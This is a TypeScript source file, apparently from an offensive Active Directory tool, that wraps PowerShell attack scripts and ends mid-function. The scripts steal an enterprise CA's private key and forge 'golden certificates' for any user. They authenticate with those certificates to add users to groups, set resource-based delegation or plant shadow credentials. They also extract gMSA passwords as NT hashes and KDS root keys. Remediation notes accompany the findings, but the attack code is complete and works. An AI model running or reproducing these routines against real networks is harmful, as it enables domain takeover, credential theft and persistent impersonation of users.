import { ps, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function goldenCert(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const ca = argVal(args, "--ca")
  const targetUser = argVal(args, "--target-user")
  const outfile = argVal(args, "--outfile")
  const findings: Finding[] = []
  const output: string[] = ["[*] Golden Certificate — CA Private Key Attack\n"]

  if (action === "enum") {
    const script = `
# Enumerate Certificate Authorities
Write-Output "[*] Enumerating Enterprise CAs..."
$configContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$caContainer = [ADSI]"LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,$configContext"

foreach ($caEntry in $caContainer.Children) {
    $caName = $caEntry.Properties["cn"][0]
    $caDnsName = $caEntry.Properties["dNSHostName"][0]
    $caCert = $caEntry.Properties["cACertificate"][0]
    $caTemplates = $caEntry.Properties["certificateTemplates"]

    Write-Output ""
    Write-Output "[+] CA: $caName"
    Write-Output "    Host: $caDnsName"
    Write-Output "    Templates: $($caTemplates.Count)"

    # Check CA certificate details
    if ($caCert) {
        $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$caCert)
        Write-Output "    Subject: $($cert.Subject)"
        Write-Output "    Issuer: $($cert.Issuer)"
        Write-Output "    NotAfter: $($cert.NotAfter)"
        Write-Output "    Thumbprint: $($cert.Thumbprint)"
        Write-Output "    KeyAlgorithm: $($cert.PublicKey.Key.KeySize)-bit $($cert.PublicKey.Oid.FriendlyName)"
    }
}

# Check if current user can backup CA
Write-Output ""
Write-Output "[*] Checking CA backup permissions..."
try {
    $caInfo = certutil -config "${ca || ""}" -CAInfo 2>&1
    if ($caInfo -match "CA type") {
        Write-Output "[+] certutil -CAInfo accessible — may have backup rights"
    }
} catch {
    Write-Output "[-] Cannot query CA info"
}

# Check for CA private key in local cert store (if running on CA server)
Write-Output ""
Write-Output "[*] Checking local machine cert store for CA keys..."
$caCerts = Get-ChildItem Cert:\\LocalMachine\\My | Where-Object { $_.HasPrivateKey -and $_.Extensions | Where-Object { $_.Oid.FriendlyName -eq "Basic Constraints" -and $_.CertificateAuthority } }
foreach ($c in $caCerts) {
    Write-Output "[!] CA certificate with private key found locally!"
    Write-Output "    Subject: $($c.Subject)"
    Write-Output "    Thumbprint: $($c.Thumbprint)"
    Write-Output "    Exportable: check with certutil -store My $($c.Thumbprint)"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    findings.push({
      checkId: "WIN-GCERT-001",
      provider: "windows",
      severity: "informational",
      status: "ENUMERATED",
      resource: "adcs://enterprise-cas",
      title: "Certificate Authorities enumerated",
      details: result.stdout.substring(0, 500),
      remediation: "Restrict CA backup permissions. Monitor certutil usage and CA private key access",
    })
  } else if (action === "extract") {
    if (!ca) return { output: "[!] Required: --ca CA_NAME", findings }
    const script = `
# Extract CA private key
Write-Output "[*] Attempting CA private key extraction for: ${ca}"

# Method 1: certutil backup (requires CA admin rights)
$backupDir = "C:\\Windows\\Temp\\cs-ca-backup-" + (Get-Random -Maximum 99999)
New-Item -ItemType Directory -Path $backupDir -Force | Out-Null

Write-Output "[*] Method 1: certutil -backup..."
try {
    $backupResult = certutil -backup $backupDir 2>&1
    if (Test-Path "$backupDir\\*.p12") {
        Write-Output "[+] CA backup successful!"
        $p12Files = Get-ChildItem "$backupDir\\*.p12"
        foreach ($f in $p12Files) {
            Write-Output "    P12: $($f.FullName) ($($f.Length) bytes)"
        }
        Write-Output "[+] P12 contains CA private key — import and forge certs"
    } else {
        Write-Output "[-] Backup completed but no P12 found"
        Write-Output "    Output: $backupResult"
    }
} catch {
    Write-Output "[-] certutil backup failed: $($_.Exception.Message)"
}

# Method 2: Check registry for CA private key container
Write-Output ""
Write-Output "[*] Method 2: Registry CA key container check..."
try {
    $caKeyReg = Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Cryptography\\Services\\${ca}\\Configuration" -ErrorAction SilentlyContinue
    if ($caKeyReg) {
        Write-Output "[+] CA configuration found in registry"
        Write-Output "    CAType: $($caKeyReg.CAType)"
        if ($caKeyReg.PSObject.Properties["CACertHash"]) {
            Write-Output "    CACertHash: $($caKeyReg.CACertHash)"
        }
    }
} catch {
    Write-Output "[-] Cannot read CA registry: $_"
}

# Method 3: Try to export from local cert store
Write-Output ""
Write-Output "[*] Method 3: Local cert store export..."
$localCA = Get-ChildItem Cert:\\LocalMachine\\My | Where-Object { $_.Subject -match "${ca}" -and $_.HasPrivateKey }
if ($localCA) {
    $exportPath = "${outfile || "$backupDir\\ca-key.pfx"}"
    try {
        $pwd = ConvertTo-SecureString -String "CyberStr1ke!" -Force -AsPlainText
        Export-PfxCertificate -Cert $localCA[0] -FilePath $exportPath -Password $pwd -Force | Out-Null
        Write-Output "[+] CA certificate + private key exported!"
        Write-Output "    File: $exportPath"
        Write-Output "    Password: CyberStr1ke!"
        Write-Output "[+] Use this PFX to forge certificates for any user"
    } catch {
        Write-Output "[-] Export failed (key may not be exportable): $_"
        Write-Output "[*] Try: mimikatz # crypto::capi or crypto::cng to patch CryptoAPI"
    }
} else {
    Write-Output "[-] No CA cert with private key found in local store"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    if (result.stdout.includes("private key exported") || result.stdout.includes("backup successful")) {
      findings.push({
        checkId: "WIN-GCERT-002",
        provider: "windows",
        severity: "critical",
        status: "EXTRACTED",
        resource: `adcs://${ca}`,
        title: "CA private key extracted — Golden Certificate possible",
        details:
          "CA private key extracted. Can forge certificates for any domain user, enabling persistent domain access that survives krbtgt rotation",
        remediation: "Rotate CA keys immediately. Restrict CA backup permissions. Enable CA audit logging",
      })
    }
  } else if (action === "forge") {
    if (!ca) return { output: "[!] Required: --ca CA_NAME", findings }
    if (!targetUser) return { output: "[!] Required: --target-user USER", findings }
    const certPath = outfile || "C:\\Windows\\Temp\\cs-forged-cert.pfx"
    const script = `
# Forge certificate for target user using stolen CA key
Write-Output "[*] Forging certificate for: ${targetUser}"

# Find CA cert in store
$caCert = Get-ChildItem Cert:\\LocalMachine\\My | Where-Object { $_.Subject -match "${ca}" -and $_.HasPrivateKey } | Select-Object -First 1
if (-not $caCert) {
    # Try from backup PFX
    $backupDir = "C:\\Windows\\Temp\\cs-ca-backup-*"
    $pfxFiles = Get-ChildItem $backupDir -Filter "*.p12" -Recurse -ErrorAction SilentlyContinue
    if ($pfxFiles) {
        $pwd = ConvertTo-SecureString -String "CyberStr1ke!" -Force -AsPlainText
        $caCert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($pfxFiles[0].FullName, $pwd, "Exportable")
        Write-Output "[+] Loaded CA cert from backup PFX"
    } else {
        Write-Output "[!] CA certificate not found — extract first with --action extract"
        exit 1
    }
}

# Look up target user's UPN
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(sAMAccountName=${targetUser})"
$searcher.PropertiesToLoad.AddRange(@("userPrincipalName", "distinguishedName"))
$userResult = $searcher.FindOne()
$upn = if ($userResult) { $userResult.Properties["userprincipalname"][0] } else { "${targetUser}@" + [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name }
$dn = if ($userResult) { $userResult.Properties["distinguishedname"][0] } else { "" }
Write-Output "[+] Target UPN: $upn"
Write-Output "[+] Target DN: $dn"

# Generate new RSA key pair for forged cert
Add-Type -AssemblyName System.Security
$rsa = [System.Security.Cryptography.RSA]::Create(2048)

# Create certificate request
$certReq = [System.Security.Cryptography.X509Certificates.CertificateRequest]::new(
    "CN=${targetUser}",
    $rsa,
    [System.Security.Cryptography.HashAlgorithmName]::SHA256,
    [System.Security.Cryptography.RSASignaturePadding]::Pkcs1
)

# Add SAN with UPN
$sanBuilder = [System.Security.Cryptography.X509Certificates.SubjectAlternativeNameBuilder]::new()
$sanBuilder.AddUserPrincipalName($upn)
$certReq.CertificateExtensions.Add($sanBuilder.Build())

# Add Client Auth EKU
$ekuOid = [System.Security.Cryptography.OidCollection]::new()
$ekuOid.Add([System.Security.Cryptography.Oid]::new("1.3.6.1.5.5.7.3.2")) | Out-Null  # Client Auth
$ekuOid.Add([System.Security.Cryptography.Oid]::new("1.3.6.1.4.1.311.20.2.2")) | Out-Null  # Smart Card Logon
$certReq.CertificateExtensions.Add([System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension]::new($ekuOid, $false))

# Sign with CA key
$serial = [byte[]]::new(16)
[System.Security.Cryptography.RandomNumberGenerator]::Fill($serial)
$notBefore = [DateTimeOffset]::UtcNow.AddDays(-1)
$notAfter = [DateTimeOffset]::UtcNow.AddYears(1)

$forgedCert = $certReq.Create($caCert, $notBefore, $notAfter, $serial)

# Export with private key
$forgedWithKey = $forgedCert.CopyWithPrivateKey($rsa)
$pfxBytes = $forgedWithKey.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, "CyberStr1ke!")
[System.IO.File]::WriteAllBytes("${certPath}", $pfxBytes)

Write-Output ""
Write-Output "[+] FORGED CERTIFICATE CREATED!"
Write-Output "    Subject: CN=${targetUser}"
Write-Output "    SAN/UPN: $upn"
Write-Output "    EKU: Client Auth + Smart Card Logon"
Write-Output "    Signed by: $($caCert.Subject)"
Write-Output "    Valid: $($notBefore.ToString('yyyy-MM-dd')) to $($notAfter.ToString('yyyy-MM-dd'))"
Write-Output "    File: ${certPath}"
Write-Output "    Password: CyberStr1ke!"
Write-Output ""
Write-Output "[*] Next steps:"
Write-Output "    1. winhook pass_the_cert --cert ${certPath} --password CyberStr1ke! --target DC --action ldap-shell"
Write-Output "    2. winhook unpac_hash --cert ${certPath} --password CyberStr1ke! --user ${targetUser} --domain DOMAIN"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    if (result.stdout.includes("FORGED CERTIFICATE CREATED")) {
      findings.push({
        checkId: "WIN-GCERT-003",
        provider: "windows",
        severity: "critical",
        status: "FORGED",
        resource: `adcs://${targetUser}`,
        title: `Golden Certificate forged for ${targetUser}`,
        details: `Forged certificate at ${certPath} — can authenticate as ${targetUser} via PKINIT or Schannel`,
        remediation:
          "Revoke all certificates signed by compromised CA. Regenerate CA key pair. Monitor certificate-based authentication events (4768 with pre-auth type 16)",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function passTheCert(args: string[], timeout: number): Promise<HookResult> {
  const cert = argVal(args, "--cert")
  const certPass = argVal(args, "--password") || ""
  const target = argVal(args, "--target")
  const action = argVal(args, "--action") || "ldap-shell"
  const targetUser = argVal(args, "--target-user")
  const targetGroup = argVal(args, "--target-group")
  const findings: Finding[] = []
  const output: string[] = ["[*] Pass-the-Certificate — Certificate-Based Authentication\n"]

  if (!cert) return { output: "[!] Required: --cert CERT_PATH", findings }
  if (!target) return { output: "[!] Required: --target LDAP_SERVER", findings }

  const script = `
# Load certificate
Write-Output "[*] Loading certificate: ${cert}"
try {
    $certObj = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2("${cert}", "${certPass}", "Exportable")
    Write-Output "[+] Certificate loaded"
    Write-Output "    Subject: $($certObj.Subject)"
    Write-Output "    Issuer: $($certObj.Issuer)"
    Write-Output "    HasPrivateKey: $($certObj.HasPrivateKey)"
    Write-Output "    Thumbprint: $($certObj.Thumbprint)"

    # Extract UPN from SAN
    $san = $certObj.Extensions | Where-Object { $_.Oid.FriendlyName -eq "Subject Alternative Name" }
    if ($san) {
        $sanText = $san.Format($false)
        Write-Output "    SAN: $sanText"
    }
} catch {
    Write-Output "[!] Failed to load certificate: $($_.Exception.Message)"
    exit 1
}

if (-not $certObj.HasPrivateKey) {
    Write-Output "[!] Certificate must have a private key for authentication"
    exit 1
}

# Connect to LDAP with certificate via Schannel
Write-Output ""
Write-Output "[*] Connecting to ${target} via LDAPS with certificate..."

Add-Type -AssemblyName System.DirectoryServices.Protocols

$ldapConn = New-Object System.DirectoryServices.Protocols.LdapConnection("${target}:636")
$ldapConn.SessionOptions.SecureSocketLayer = $true
$ldapConn.SessionOptions.VerifyServerCertificate = { $true }
$ldapConn.AuthType = [System.DirectoryServices.Protocols.AuthType]::External

# Set client certificate
$ldapConn.ClientCertificates.Add($certObj) | Out-Null

try {
    $ldapConn.Bind()
    Write-Output "[+] LDAPS bind successful with certificate!"

    # Get current identity
    $whoami = New-Object System.DirectoryServices.Protocols.SearchRequest(
        "",
        "(objectClass=*)",
        [System.DirectoryServices.Protocols.SearchScope]::Base,
        @("tokenGroups", "objectSid")
    )
    $whoamiResult = $ldapConn.SendRequest($whoami)
    Write-Output "[+] Authenticated successfully via Schannel"

    ${
      action === "add-user-to-group"
        ? `
    # Add user to group
    if (-not "${targetUser}" -or -not "${targetGroup}") {
        Write-Output "[!] Required: --target-user and --target-group"
    } else {
        Write-Output "[*] Adding ${targetUser} to ${targetGroup}..."
        $searchReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
            $null,
            "(sAMAccountName=${targetGroup})",
            [System.DirectoryServices.Protocols.SearchScope]::Subtree,
            @("distinguishedName")
        )
        $groupResult = $ldapConn.SendRequest($searchReq)
        if ($groupResult.Entries.Count -gt 0) {
            $groupDN = $groupResult.Entries[0].DistinguishedName

            $userSearchReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                $null,
                "(sAMAccountName=${targetUser})",
                [System.DirectoryServices.Protocols.SearchScope]::Subtree,
                @("distinguishedName")
            )
            $userResult = $ldapConn.SendRequest($userSearchReq)
            $userDN = $userResult.Entries[0].DistinguishedName

            $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                $groupDN,
                [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add,
                "member",
                $userDN
            )
            $ldapConn.SendRequest($mod) | Out-Null
            Write-Output "[+] Successfully added $userDN to $groupDN"
        }
    }
    `
        : action === "rbcd"
          ? `
    # Set RBCD on target
    Write-Output "[*] Setting RBCD delegation..."
    if (-not "${targetUser}") {
        Write-Output "[!] Required: --target-user (machine account to delegate from)"
    } else {
        $searchReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
            $null,
            "(sAMAccountName=${targetUser})",
            [System.DirectoryServices.Protocols.SearchScope]::Subtree,
            @("objectSid")
        )
        $machineResult = $ldapConn.SendRequest($searchReq)
        if ($machineResult.Entries.Count -gt 0) {
            $machineSid = New-Object System.Security.Principal.SecurityIdentifier($machineResult.Entries[0].Attributes["objectSid"][0], 0)
            Write-Output "[+] Machine SID: $machineSid"

            # Build security descriptor
            $sd = New-Object System.DirectoryServices.ActiveDirectorySecurity
            $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                $machineSid,
                [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
                [System.Security.AccessControl.AccessControlType]::Allow
            )
            $sd.AddAccessRule($ace)
            $sdBytes = $sd.GetSecurityDescriptorBinaryForm()

            # Find target computer
            $targetSearchReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                $null,
                "(&(objectCategory=computer)(sAMAccountName=${target}$))",
                [System.DirectoryServices.Protocols.SearchScope]::Subtree,
                @("distinguishedName")
            )
            $targetResult = $ldapConn.SendRequest($targetSearchReq)
            if ($targetResult.Entries.Count -gt 0) {
                $targetDN = $targetResult.Entries[0].DistinguishedName
                $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
                    $targetDN,
                    [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
                    "msDS-AllowedToActOnBehalfOfOtherIdentity",
                    $sdBytes
                )
                $ldapConn.SendRequest($mod) | Out-Null
                Write-Output "[+] RBCD set on $targetDN for $machineSid"
            }
        }
    }
    `
          : action === "shadow-cred"
            ? `
    # Add shadow credential
    Write-Output "[*] Adding shadow credential to target..."
    if (-not "${targetUser}") {
        Write-Output "[!] Required: --target-user"
    } else {
        Write-Output "[*] Generating key credential..."
        $searchReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
            $null,
            "(sAMAccountName=${targetUser})",
            [System.DirectoryServices.Protocols.SearchScope]::Subtree,
            @("distinguishedName", "msDS-KeyCredentialLink")
        )
        $targetResult = $ldapConn.SendRequest($searchReq)
        if ($targetResult.Entries.Count -gt 0) {
            $targetDN = $targetResult.Entries[0].DistinguishedName
            Write-Output "[+] Target: $targetDN"
            Write-Output "[+] Use shadow_creds tool for full KeyCredential generation"
            Write-Output "    winhook shadow_creds --target ${targetUser} --action add"
        }
    }
    `
            : `
    # LDAP shell — enumerate with cert auth
    Write-Output ""
    Write-Output "[*] Querying domain info via cert-authenticated LDAP..."
    $domainReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
        "",
        "(objectClass=*)",
        [System.DirectoryServices.Protocols.SearchScope]::Base,
        @("defaultNamingContext", "dnsHostName", "serverName")
    )
    $domainResult = $ldapConn.SendRequest($domainReq)
    if ($domainResult.Entries.Count -gt 0) {
        $entry = $domainResult.Entries[0]
        Write-Output "[+] Domain: $($entry.Attributes['defaultNamingContext'][0])"
        Write-Output "[+] DC: $($entry.Attributes['dnsHostName'][0])"
    }

    # List privileged users
    $privReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
        $null,
        "(&(objectCategory=person)(adminCount=1))",
        [System.DirectoryServices.Protocols.SearchScope]::Subtree,
        @("sAMAccountName", "distinguishedName")
    )
    $privResult = $ldapConn.SendRequest($privReq)
    Write-Output ""
    Write-Output "[+] Privileged users (adminCount=1): $($privResult.Entries.Count)"
    foreach ($e in $privResult.Entries) {
        Write-Output "    $($e.Attributes['sAMAccountName'][0])"
    }
    `
    }

} catch {
    Write-Output "[!] LDAPS bind failed: $($_.Exception.Message)"
    Write-Output "[*] Ensure LDAPS is available on port 636 and the certificate has Client Auth EKU"
}

$ldapConn.Dispose()
`
  const result = await ps(script, timeout)
  output.push(result.stdout)

  if (result.stdout.includes("bind successful")) {
    findings.push({
      checkId: "WIN-PTC-001",
      provider: "windows",
      severity: "critical",
      status: "AUTHENTICATED",
      resource: `ldap://${target}`,
      title: "Certificate-based LDAP authentication successful",
      details: `Authenticated to ${target} using certificate ${cert}. Action: ${action}`,
      remediation:
        "Enable LDAP channel binding. Require strong certificate mapping (StrongCertificateBindingEnforcement=2). Monitor 4768 events with pre-auth type 16",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function gmsaDump(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const target = argVal(args, "--target")
  const dc = argVal(args, "--dc")
  const findings: Finding[] = []
  const output: string[] = ["[*] gMSA Password Extraction\n"]

  if (action === "enum") {
    const script = `
# Enumerate all gMSA accounts
Write-Output "[*] Enumerating Group Managed Service Accounts..."
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(objectClass=msDS-GroupManagedServiceAccount)"
$searcher.PropertiesToLoad.AddRange(@(
    "sAMAccountName", "distinguishedName", "servicePrincipalName",
    "msDS-ManagedPasswordInterval", "msDS-ManagedPasswordId",
    "msDS-GroupMSAMembership", "PrincipalsAllowedToRetrieveManagedPassword",
    "objectSid", "whenCreated", "description"
))

$results = $searcher.FindAll()
Write-Output "[+] Found $($results.Count) gMSA accounts"

$readable = @()

foreach ($r in $results) {
    $name = $r.Properties["samaccountname"][0]
    $dn = $r.Properties["distinguishedname"][0]
    $spns = $r.Properties["serviceprincipalname"]
    $interval = $r.Properties["msds-managedpasswordinterval"]
    $created = $r.Properties["whencreated"]
    $desc = $r.Properties["description"]

    Write-Output ""
    Write-Output "[+] gMSA: $name"
    Write-Output "    DN: $dn"
    if ($desc.Count -gt 0) { Write-Output "    Description: $($desc[0])" }
    if ($interval.Count -gt 0) { Write-Output "    Password Interval: $($interval[0]) days" }
    if ($created.Count -gt 0) { Write-Output "    Created: $($created[0])" }

    if ($spns.Count -gt 0) {
        Write-Output "    SPNs:"
        foreach ($spn in $spns) { Write-Output "      - $spn" }
    }

    # Check PrincipalsAllowedToRetrieveManagedPassword
    $membership = $r.Properties["msds-groupmsamembership"]
    if ($membership.Count -gt 0) {
        Write-Output "    Allowed to retrieve password:"
        try {
            $sd = New-Object System.DirectoryServices.ActiveDirectorySecurity
            $sd.SetSecurityDescriptorBinaryForm($membership[0])
            $rules = $sd.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])
            foreach ($rule in $rules) {
                Write-Output "      - $($rule.IdentityReference)"
                # Check if current user matches
                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $currentGroups = $currentUser.Groups | ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]).Value }
                $identity = $rule.IdentityReference.Value
                if ($identity -eq $currentUser.Name -or $currentGroups -contains $identity) {
                    Write-Output "      [!] CURRENT USER CAN READ THIS gMSA PASSWORD!"
                    $readable += $name
                }
            }
        } catch {
            Write-Output "      (could not parse membership descriptor)"
        }
    }
}

Write-Output ""
if ($readable.Count -gt 0) {
    Write-Output "[+] READABLE gMSA accounts: $($readable -join ', ')"
    Write-Output "[*] Extract with: winhook gmsa_dump --action extract --target GMSA_NAME"
} else {
    Write-Output "[-] No gMSA passwords readable by current user"
    Write-Output "[*] Need membership in PrincipalsAllowedToRetrieveManagedPassword"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    const count = (result.stdout.match(/gMSA:/g) || []).length
    findings.push({
      checkId: "WIN-GMSA-001",
      provider: "windows",
      severity: result.stdout.includes("CAN READ") ? "critical" : "informational",
      status: "ENUMERATED",
      resource: "ad://gmsa-accounts",
      title: `${count} gMSA accounts enumerated`,
      details: result.stdout.substring(0, 500),
      remediation: "Restrict PrincipalsAllowedToRetrieveManagedPassword to only necessary service hosts",
    })
  } else if (action === "extract") {
    if (!target) return { output: "[!] Required: --target GMSA_NAME", findings }
    const script = `
# Extract gMSA password and compute NT hash
Write-Output "[*] Extracting password for gMSA: ${target}"

$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectClass=msDS-GroupManagedServiceAccount)(sAMAccountName=${target}))"
$searcher.PropertiesToLoad.AddRange(@("sAMAccountName", "msDS-ManagedPassword", "objectSid"))

$result = $searcher.FindOne()
if (-not $result) {
    Write-Output "[!] gMSA account '${target}' not found"
    exit 1
}

$managedPwd = $result.Properties["msds-managedpassword"]
if ($managedPwd.Count -eq 0) {
    Write-Output "[!] Cannot read msDS-ManagedPassword — access denied"
    Write-Output "[*] Current user is not in PrincipalsAllowedToRetrieveManagedPassword"
    exit 1
}

$blob = [byte[]]$managedPwd[0]
Write-Output "[+] msDS-ManagedPassword blob retrieved ($($blob.Length) bytes)"

# Parse MSDS-MANAGEDPASSWORD_BLOB structure
# Version (2 bytes) + Reserved (2 bytes) + Length (4 bytes) + CurrentPasswordOffset (2 bytes)
$version = [BitConverter]::ToUInt16($blob, 0)
$length = [BitConverter]::ToUInt32($blob, 4)
$currentPwdOffset = [BitConverter]::ToUInt16($blob, 8)

Write-Output "[+] Blob version: $version, Length: $length"
Write-Output "[+] Current password offset: $currentPwdOffset"

# Extract current password (Unicode string)
$oldPwdOffset = [BitConverter]::ToUInt16($blob, 10)
$pwdLength = if ($oldPwdOffset -gt 0) { $oldPwdOffset - $currentPwdOffset } else { $blob.Length - $currentPwdOffset }

# Cap at reasonable length
if ($pwdLength -gt 256) { $pwdLength = 256 }
$passwordBytes = $blob[$currentPwdOffset..($currentPwdOffset + $pwdLength - 1)]

Write-Output "[+] Password bytes extracted ($pwdLength bytes)"

# Compute NT hash (MD4 of UTF-16LE password)
Add-Type -TypeDefinition @"
using System;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

public class NTHash {
    [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemFunction007(ref UNICODE_STRING str, byte[] hash);

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    public static byte[] ComputeMD4(byte[] data) {
        // Simple MD4 via BCrypt
        byte[] hash = new byte[16];
        IntPtr ptr = Marshal.AllocHGlobal(data.Length);
        Marshal.Copy(data, 0, ptr, data.Length);
        UNICODE_STRING us = new UNICODE_STRING();
        us.Length = (ushort)data.Length;
        us.MaximumLength = (ushort)data.Length;
        us.Buffer = ptr;
        SystemFunction007(ref us, hash);
        Marshal.FreeHGlobal(ptr);
        return hash;
    }
}
"@

try {
    $ntHash = [NTHash]::ComputeMD4($passwordBytes)
    $hashHex = ($ntHash | ForEach-Object { $_.ToString("x2") }) -join ""
    Write-Output ""
    Write-Output "[+] ================================"
    Write-Output "[+] gMSA: ${target}"
    Write-Output "[+] NT HASH: $hashHex"
    Write-Output "[+] ================================"
    Write-Output ""
    Write-Output "[*] Use this hash for:"
    Write-Output "    - Pass-the-hash: winhook wmi_exec --target HOST --user ${target} --hash $hashHex"
    Write-Output "    - DCSync: winhook dcsync --target krbtgt (if gMSA has replication rights)"
    Write-Output "    - Silver ticket: winhook silver_ticket --service-hash $hashHex --spn SPN"
} catch {
    Write-Output "[!] NT hash computation failed: $_"
    Write-Output "[*] Raw password bytes (hex): $(($passwordBytes | ForEach-Object { $_.ToString("x2") }) -join '')"
}

# Get SID
$sidBytes = [byte[]]$result.Properties["objectsid"][0]
$sid = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)
Write-Output "[+] gMSA SID: $sid"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    if (result.stdout.includes("NT HASH:")) {
      findings.push({
        checkId: "WIN-GMSA-002",
        provider: "windows",
        severity: "critical",
        status: "EXTRACTED",
        resource: `ad://gmsa/${target}`,
        title: `gMSA password extracted: ${target}`,
        details:
          "NT hash computed from msDS-ManagedPassword blob. Can be used for pass-the-hash, silver ticket, or DCSync if gMSA has replication rights",
        remediation:
          "Review PrincipalsAllowedToRetrieveManagedPassword ACL. Monitor for unusual gMSA password reads (event 4662 on msDS-ManagedPassword)",
      })
    }
  } else if (action === "golden") {
    const script = `
# GoldenGMSA — extract KDS root key for offline password computation
Write-Output "[*] GoldenGMSA — KDS Root Key Extraction"
Write-Output "[*] This allows offline computation of ANY gMSA password"
Write-Output ""

# Enumerate KDS root keys
$configContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$kdsContainer = "CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,$configContext"

$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = [ADSI]"LDAP://$kdsContainer"
$searcher.Filter = "(objectClass=msKds-ProvRootKey)"
$searcher.PropertiesToLoad.AddRange(@("cn", "msKds-KDFParam", "msKds-KDFAlgorithmID",
    "msKds-SecretAgreementParam", "msKds-SecretAgreementAlgorithmID",
    "msKds-RootKeyData", "msKds-CreateTime", "msKds-UseStartTime",
    "msKds-DomainID", "msKds-Version"))

$keys = $searcher.FindAll()
Write-Output "[+] Found $($keys.Count) KDS root keys"

foreach ($key in $keys) {
    $cn = $key.Properties["cn"][0]
    $createTime = $key.Properties["mskds-createtime"]
    $useStartTime = $key.Properties["mskds-usestarttime"]
    $kdfAlgo = $key.Properties["mskds-kdfalgorithmid"]
    $rootKeyData = $key.Properties["mskds-rootkeydata"]

    Write-Output ""
    Write-Output "[+] Root Key: $cn"
    if ($createTime.Count -gt 0) { Write-Output "    Created: $($createTime[0])" }
    if ($useStartTime.Count -gt 0) { Write-Output "    Use Start: $($useStartTime[0])" }
    if ($kdfAlgo.Count -gt 0) { Write-Output "    KDF Algorithm: $($kdfAlgo[0])" }

    if ($rootKeyData.Count -gt 0) {
        $keyBytes = [byte[]]$rootKeyData[0]
        $keyHex = ($keyBytes[0..31] | ForEach-Object { $_.ToString("x2") }) -join ""
        Write-Output "    [!] Root Key Data retrieved ($($keyBytes.Length) bytes)"
        Write-Output "    Key (first 32 bytes): $keyHex..."
        Write-Output "    [!] With this key, ANY gMSA password can be computed offline"
    } else {
        Write-Output "    [-] Cannot read root key data (insufficient permissions)"
        Write-Output "    [*] Requires Domain Admin or key distribution service account access"
    }
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    if (result.stdout.includes("Root Key Data retrieved")) {
      findings.push({
        checkId: "WIN-GMSA-003",
        provider: "windows",
        severity: "critical",
        status: "EXTRACTED",
        resource: "ad://kds-root-keys",
        title: "KDS root key extracted — GoldenGMSA possible",
        details: "KDS root key data retrieved. Can compute ANY gMSA password offline without AD access",
        remediation:
          "Rotate KDS root keys. Restrict access to CN=Master Root Keys container. Monitor 4662 events on KDS key objects",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function goldenGmsa(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const sid = argVal(args, "--sid")
  const kdsKeyId = argVal(args, "--kds-key-id")
  const findings: Finding[] = []
  const output: string[] = ["[*] GoldenGMSA attack operations...\n"]

  if (action === "enum") {
    const script = `
Write-Output "=== KDS Root Key Enumeration ==="
Write-Output ""

# Enumerate KDS root keys from AD
$configDN = ([ADSI]"LDAP://RootDSE").configurationNamingContext
$kdsContainer = "CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,$configDN"
Write-Output "KDS Container: $kdsContainer"
Write-Output ""

try {
  $searcher = New-Object System.DirectoryServices.DirectorySearcher
  $searcher.SearchRoot = [ADSI]"LDAP://$kdsContainer"
  $searcher.Filter = "(objectClass=msKds-ProvRootKey)"
  $searcher.PropertiesToLoad.AddRange(@('cn', 'msKds-CreateTime', 'msKds-UseStartTime', 'msKds-DomainID', 'msKds-Version', 'msKds-KDFAlgorithmID', 'msKds-SecretAgreementAlgorithmID', 'msKds-RootKeyData', 'msKds-KDFParam', 'msKds-SecretAgreementParam', 'msKds-PrivateKeyLength', 'msKds-PublicKeyLength', 'whenCreated'))
  $results = $searcher.FindAll()

  Write-Output "KDS Root Keys Found: $($results.Count)"
  Write-Output "KDS_COUNT=$($results.Count)"
  Write-Output ""

  foreach ($r in $results) {
    $props = $r.Properties
